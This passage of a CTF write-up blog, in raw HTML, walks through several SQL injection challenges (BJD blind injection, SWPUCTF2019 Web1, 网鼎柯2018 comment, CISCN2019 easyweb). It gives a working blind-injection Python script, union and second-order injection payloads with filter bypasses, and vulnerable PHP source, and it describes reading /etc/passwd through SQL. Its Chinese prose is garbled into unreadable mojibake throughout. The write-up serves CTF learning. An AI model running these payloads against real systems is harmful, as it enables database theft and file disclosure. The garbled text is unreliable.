id="è§£é¢˜-v12">è§£é¢˜</h3><p>è®¿é—®<code>robots.txt</code>é¡µé¢æç¤ºæœ‰<code>hint.php</code>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username&#x3D;&#39;$_POST[&quot;username&quot;]&#39; and password&#x3D;&#39;$_POST[&quot;password&quot;]&#39;;</span><br></pre></td></tr></table></figure><p>fuzzä¸€ä¸‹å‘ç°ï¼šç©ºæ ¼å•åŒå¼•å·è¿‡æ»¤ï¼Œ\æ²¡è¿‡æ»¤ï¼Œå¦‚æœæœªå¯¹<code>$_POST[&quot;username&quot;]</code>è¿›è¡Œå…¶ä»–é™åˆ¶ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨åæ–œæ å°†ç¬¬äºŒä¸ªå•å¼•å·è½¬ä¹‰ï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªå•å¼•å·å’Œç¬¬ä¸‰ä¸ªå•å¼•å·æ„æˆè¯­å¥ï¼š<code>username='xxxxx', $_POST[&quot;password&quot;]</code>åˆ™å¯è¿›è¡Œç›²æ³¨ã€‚</p><p><code>username=admin\  password=or/**/length(database())&gt;0#</code>å›æ˜¾<code>BJD needs to be stronger</code></p><p><code>username=admin\  password=or/**/length(database())&lt;0#</code>å›æ˜¾<code>You konw ,P3rh4ps needs a girl friend</code></p><p>å†™ç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2cfb1e37-5400-4888-895d-bd5db365a250.node3.buuoj.cn/index.php&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">flag = <span class="string">&#x27;BJD needs to be stronger&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> high &gt; low:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">&quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;</span> % (i, mid)</span><br><span class="line">        data[<span class="string">&#x27;password&#x27;</span>] = payload</span><br><span class="line"></span><br><span class="line">        rs = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> rs.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> low != <span class="number">32</span>:</span><br><span class="line">        result += chr(low)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>password:OhyOuFOuNdit</code></p><h2 id="SWPUCTF2019-Web1">SWPUCTF2019 Web1</h2><h3 id="è€ƒç‚¹-v14">è€ƒç‚¹</h3><ul><li>äºŒæ¬¡æ³¨å…¥</li><li>MySQLæ— åˆ—åæ³¨å…¥</li><li>MySQL5.7+ æ–°ç‰¹æ€§</li></ul><h3 id="çŸ¥è¯†å‚¨å¤‡">çŸ¥è¯†å‚¨å¤‡</h3><p>æ— åˆ—åæ³¨å…¥ä¸»è¦æ˜¯é€‚ç”¨äºå·²ç»è·å–åˆ°æ•°æ®è¡¨ï¼Œä½†æ— æ³•æŸ¥è¯¢åˆ—çš„æƒ…å†µä¸‹ï¼Œåœ¨CTFé¢˜ç›®ä¸­å¸¸å¸¸æ˜¯å› ä¸ºinformation_schemaè¢«è¿‡æ»¤çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•è·å–åˆ—åã€‚</p><p>æ— åˆ—åæ³¨å…¥çš„åŸç†å…¶å®ç±»ä¼¼äºå°†æˆ‘ä»¬ä¸çŸ¥é“çš„åˆ—åï¼Œè¿›è¡Œå–åˆ«åæ“ä½œï¼Œåœ¨å–åˆ«åçš„åŒæ—¶è¿›è¡Œæ•°æ®æŸ¥è¯¢ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æŸ¥è¯¢çš„å­—æ®µå¤šäºæ•°æ®è¡¨ä¸­åˆ—çš„æ—¶å€™ï¼Œä¼šå‡ºç°æŠ¥é”™ã€‚</p><blockquote><p>åœ¨ information_schema ä¸­ï¼Œé™¤äº† SCHEMATAã€TABLESã€COLUMNS æœ‰è¡¨ä¿¡æ¯å¤–ï¼Œé«˜ç‰ˆæœ¬çš„ mysql 5.7ä»¥ä¸Šï¼Œè¿˜æœ‰ INNODB_TABLES åŠ INNODB_COLUMNS ä¸­è®°å½•ç€è¡¨ç»“æ„ã€‚</p></blockquote><p>ä¾‹å¦‚å½“å‰æœ‰ä¸€ä¸ªuserè¡¨</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702211931.png" style="zoom:67%;" /><p>å‘ç°è¯¥æ•°æ®è¡¨ä¸­æœ‰3åˆ—ï¼Œæˆ‘ä»¬ä½¿ç”¨æ— åˆ—åæŸ¥è¯¢çš„æ–¹å¼å°è¯•æŸ¥è¯¢ä¸€ä¸‹</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212049.png" style="zoom:67%;" /><p>å°è¯•å¤šä¸€ä¸ªå­—æ®µæˆ–è€…å°‘ä¸€ä¸ªå­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212208.png" style="zoom:67%;" /><p>ä»ç„¶æŠ¥é”™ï¼Œè¯æ˜æ— åˆ—åæ³¨å…¥å¿…é¡»ä¸€ä¸€å¯¹åº”æ‰€æŸ¥è¯¢æ•°æ®è¡¨çš„åˆ—æ•°ã€‚</p><p>å¯¹ä¸€åˆ—æ•°æ®è¿›è¡ŒæŸ¥è¯¢ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702212534.png" style="zoom:67%;" /><blockquote><p>æœ«å°¾çš„ a å¯ä»¥æ˜¯ä»»æ„å­—ç¬¦ï¼Œç”¨äºå‘½åã€‚</p></blockquote><p>å½“ç„¶ï¼Œå¤šæ•°æƒ…å†µä¸‹ï¼Œ` ä¼šè¢«è¿‡æ»¤ã€‚å½“ ` ä¸èƒ½ä½¿ç”¨çš„æ—¶å€™ï¼Œä½¿ç”¨åˆ«åæ¥ä»£æ›¿ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702213855.png" style="zoom:67%;" /><p>åŒæ—¶æŸ¥è¯¢å¤šä¸ªåˆ—ï¼š</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702214129.png" style="zoom:67%;" /><h3 id="è§£é¢˜-v13">è§£é¢˜</h3><p>æ³¨å†Œadminçš„æ—¶å€™æç¤ºç”¨æˆ·å·²ç»å­˜åœ¨ï¼Œé‚£ä¹ˆå°±éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·åï¼Œç™»å½•åå‘è¡¨å¹¿å‘Šï¼Œç‚¹å‡»æŸ¥çœ‹è¯¦æƒ…é¡µï¼Œç¬¬ä¸€ååº”çœ‹urlä¼ å…¥äº†idå­—æ®µï¼Œç»è¿‡æµ‹è¯•åï¼Œidå­—æ®µä¸å­˜åœ¨SQLæ³¨å…¥ã€‚</p><p>å†è€ƒè™‘æ˜¯ä¸æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå‘è¡¨å¹¿å‘Šåï¼ŒæŸ¥è¯¢å¹¿å‘Šè¯¦æƒ…çš„æ—¶å€™äº§ç”Ÿæ³¨å…¥ã€‚</p><p>æµ‹è¯•æ³¨å…¥ç‚¹ï¼š</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215827.png" alt=""></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702215848.png" alt=""></p><p>å‘ç°æ•°æ®åº“æŠ¥é”™ä¿¡æ¯ï¼Œè¯æ˜å­˜åœ¨æ³¨å…¥ï¼Œå¯æ ¹æ®æŠ¥é”™çš„ä¿¡æ¯å»æ„é€ sqlæ³¨å…¥è¯­å¥ï¼Œfuzzä¸€ä¸‹è¢«è¿‡æ»¤çš„å­—ç¬¦å’Œç¬¦å·ã€‚</p><p>å‘ç°ç©ºæ ¼ï¼Œorï¼Œ#ï¼Œâ€“+ç­‰è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬ä½¿ç”¨æ³¨é‡Šç¬¦å·æ¥ä»£æ›¿ç©ºæ ¼ã€‚æŠ¥é”™è¿‡æ»¤äº†extractvalue å’Œ updatexmlï¼Œäºæ˜¯è€ƒè™‘ç”¨ union è”åˆæ³¨å…¥ã€‚</p><p>å°è¯•é—­åˆå•å¼•å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa&#39;,&#39;</span><br></pre></td></tr></table></figure><p>å…ˆåˆ¤æ–­å­—æ®µçš„ä¸ªæ•°ï¼Œorè¢«è¿‡æ»¤äº†ä¸èƒ½ç”¨order byï¼Œä½†æ˜¯å¯ä»¥ç”¨group byæ¥æ›¿æ¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;group&#x2F;**&#x2F;by&#x2F;**&#x2F;22,&#39;</span><br></pre></td></tr></table></figure><p>åˆ¤æ–­å›æ˜¾ä½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703100141.png" alt=""></p><p>æŸ¥è¯¢ä¸€ä¸‹æ•°æ®åº“åç§°å’Œç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,database(),version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703101346.png" alt=""></p><p>ç”±äºorè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨information_schemaï¼Œä½†æ˜¯æ ¹æ®ä¸Šé¢çš„çŸ¥è¯†å‚¨å¤‡ï¼Œå¦‚æœæ•°æ®è¡¨çš„å¼•æ“æ˜¯<code>innodb</code>ï¼Œ è¿˜å¯ä»¥ç”¨<code>mysql.innodb_table_stats</code>è·å–è¡¨å</p><blockquote><p><a href="https://mariadb.com/kb/en/mysqlinnodb_table_stats/">https://mariadb.com/kb/en/mysqlinnodb_table_stats/</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703102458.png" alt=""></p><p>æˆ‘ä»¬æ— æ³•çŸ¥é“åˆ—åï¼Œå¯ä»¥é€šè¿‡æ— åˆ—åæ³¨å…¥çš„æ–¹å¼è¿›è¡Œæ³¨å…¥ï¼Œå…ˆæŸ¥è¯¢usersè¡¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200703103327.png" alt=""></p><h3 id="åè®°">åè®°</h3><p>å¦‚æœè¿‡æ»¤äº†é€—å·ï¼Œå¯ä»¥ç”¨joinå…³é”®å­—è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  1 | 2        | 3          |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯2018-comment">ç½‘é¼æ¯2018 comment</h2><h3 id="è€ƒç‚¹-v15">è€ƒç‚¹</h3><ul><li>Gitæºç æ¢å¤</li><li>ä»£ç å®¡è®¡</li><li>äºŒæ¬¡æ³¨å…¥</li></ul><h3 id="è§£é¢˜-v14">è§£é¢˜</h3><p>ä¸Šæ¥æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå…ˆç”¨dirmapæ‰«ä¸€éå‘ç°Gitæ–‡ä»¶å¤¹ï¼Œç”¨GitHackæŠŠæºç dumpä¸‹æ¥ï¼Œåªæœ‰ä¸€ä¸ª<code>write_do.php</code>æ–‡ä»¶ï¼Œå¹¶ä¸”ä¸å®Œæ•´ï¼Œéœ€è¦æŸ¥çœ‹æäº¤å†å²ã€‚å› ä¸ºlijiejieçš„GitHackä¸èƒ½æŠŠ.gitæ–‡ä»¶å¤¹åŒæ—¶dumpä¸‹æ¥ï¼Œæ‰€ä»¥è¿™é‡Œæ¢æˆwangyihangçš„GitHackerã€‚</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705112838.png" alt=""></p><p>æŸ¥çœ‹ç¬¬ä¸€ä¸ªcommit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</span><br><span class="line">HEAD ç°åœ¨ä½äº e5b2a24 WIP on master: bfbdf21 add write_do.php</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>write_do.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æäº¤è¯„è®ºè¿˜éœ€è¦ç™»å½•ï¼Œæ ¹æ®ç™»å½•æ¡†ä¸Šçš„place_holdï¼Œåº”è¯¥æ˜¯è¦çˆ†ç ´å¯†ç çš„åä¸‰ä½ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹å°±å‡ºæ¥ï¼Œä»£ç å†™å¤ªçƒ‚ä¸è´´äº†ï¼š<code>zhangwei/zhangwei666</code></p><p>æ¥ç€å®¡è®¡æºç ï¼Œå¯ä»¥çœ‹åˆ°ä¸Šé¢ç¬¬12-14è¡Œéƒ½å¯¹ POST ä¼ æ¥category ã€ title ã€contentä¸‰ä¸ªå‚æ•°è¿›è¡Œäº†ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼Œç„¶è€Œåœ¨ç¬¬28è¡Œå’Œç¬¬30-33è¡Œå¤„ç›´æ¥å°†ä»æ•°æ®åº“ä¸­å–å‡ºçš„æ•°æ®ï¼Œæœªç»ä»»ä½•è¿‡æ»¤æ‹¼æ¥åˆ°SQLè¯­å¥ ä¸­ï¼Œå¹¶ä¸”contentçš„å€¼ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸Šï¼Œè¿™å°±å­˜åœ¨äºŒæ¬¡æ³¨å…¥ ã€‚</p><blockquote><p>addslashesä¼šå°†ä¼ å…¥çš„ä¿¡æ¯éƒ½ä¼šè¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯æ•°æ®åº“ä¼šè‡ªåŠ¨æ¸…é™¤åæ–œæ ã€‚</p></blockquote><p>ä¸‹é¢è¯´è¯´äºŒæ¬¡æ³¨å…¥çš„æ”»å‡»è¿‡ç¨‹ï¼š</p><ul><li><p>å…ˆè¿›å…¥ write æ–¹æ³•ï¼Œå°†payloadï¼š <code>',content=database(),/*</code> æ’å…¥ board è¡¨çš„ category å­—æ®µä¸­</p><p>æ­¤æ—¶payloadä¸º<code>title=111&amp;category=',content=database(),/*&amp;content=1</code></p></li><li><p>å†è¿›å…¥ comment æ–¹æ³•ï¼Œç¨‹åºå°† board è¡¨ä¸­çš„ category å­—æ®µå–å‡ºï¼Œæ²¡è¿›è¡Œè¿‡æ»¤ï¼Œæ‹¼æ¥åˆ°æ–°çš„ insert è¯­å¥ä¸­ã€‚ç”±äºæˆ‘ä»¬ä¹‹å‰çš„ payload ä¸­å¸¦æœ‰ /* ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é—­åˆå®ƒï¼Œå³æˆ‘ä»¬åœ¨è¯„è®ºå¤„æäº¤ <code>*/#</code> (å¯¹åº” content å˜é‡çš„å€¼)ï¼Œç”¨äºé—­åˆ<code>/*</code></p></li><li><p>ç„¶åç¨‹åºæ‰§è¡Œç¬¬äºŒä¸ªSQLè¯­å¥ï¼Œå¹¶å°†ç”¨æˆ·æäº¤çš„contentå€¼æ˜¾ç¤ºå‡ºæ¥ï¼Œè€Œæˆ‘ä»¬çš„ payload ï¼š <code>',content=user(),/*</code> å°±ä¼šæ˜¾ç¤ºå‡ºå½“å‰ç”¨æˆ·ã€‚</p></li></ul><p>æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143030.png" style="zoom:50%;" /><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143103.png" style="zoom:50%;" /><blockquote><p>å¦‚æœæ˜¯rootç”¨æˆ·ï¼Œä¸€èˆ¬ <strong>flag</strong> å°±ä¸ä¼šåœ¨æ•°æ®åº“é‡Œé¢(å› ä¸ºå¦‚æœåœ¨æ•°æ®åº“ä¸­ï¼Œä¸éœ€è¦è¿™ä¹ˆé«˜çš„æƒé™ï¼Œå®é™…ä¹Ÿç¡®å®æ²¡æœ‰ã€‚</p></blockquote><p>åº”è¯¥æ˜¯è¦ç”¨SQLè¯­å¥è¯»å–flagæ–‡ä»¶äº†ã€‚</p><p>å…ˆç”¨<code>/etc/passwd</code>åšä¸€ä¸ªéªŒè¯</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143339.png" style="zoom: 50%;" /><p>æœ‰ä¸€ä¸ªwwwç”¨æˆ·ï¼ŒæŸ¥çœ‹ä»–çš„å†å²å‘½ä»¤</p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705143628.png" style="zoom:50%;" /><p>å¯ä»¥å‘ç°ä»–åˆ é™¤äº†ä¸€ä¸ª<code>.DS_Store</code>æ–‡ä»¶ï¼Œä½†æ˜¯è¿˜å­˜åœ¨äº<code>/tmp/html</code>ç›®å½•ä¸­ï¼Œç”±äºè¿™ä¸ªæ–‡ä»¶æœ‰å¾ˆå¤šä¸å¯è§å­—ç¬¦ä¸èƒ½ç›´æ¥ç”¨ç¼–è¾‘å™¨æ‰“å¼€ï¼Œå…ˆå¯¹å…¶è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705144029.png" alt=""></p><p>å†è½¬æ¢æˆASCII</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145015.png" alt=""></p><p>flagæ–‡ä»¶å<code>flag_8946e1ff1ee3e40f.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200705145339.png" alt=""></p><p>å†è§£ç å°±å¯ä»¥å¾—åˆ°flagã€‚</p><h2 id="CISCN2019-easyweb">CISCN2019 easyweb</h2><h3 id="è€ƒç‚¹-v16">è€ƒç‚¹</h3><ul><li>æºç æ³„éœ²</li><li>MySQLç›²æ³¨</li><li>PHPçŸ­æ ‡ç­¾</li></ul><h3 id="è§£é¢˜-v15">è§£é¢˜</h3><p>åˆæ˜¯ä¸€é“ç›²æ³¨çš„é¢˜ç›®ï¼Œè¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥ã€‚ã€‚ã€‚ã€‚ã€‚</p><p><code>robots.txt</code>æç¤ºæœ‰bakå¤‡ä»½æ–‡ä»¶ï¼Œå°è¯•äº†<code>index.php.bak</code>å’Œ<code>user.php.bak</code>æ— æœåç”¨dirmapæ‰«æï¼Œå‘ç°äº†<code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span 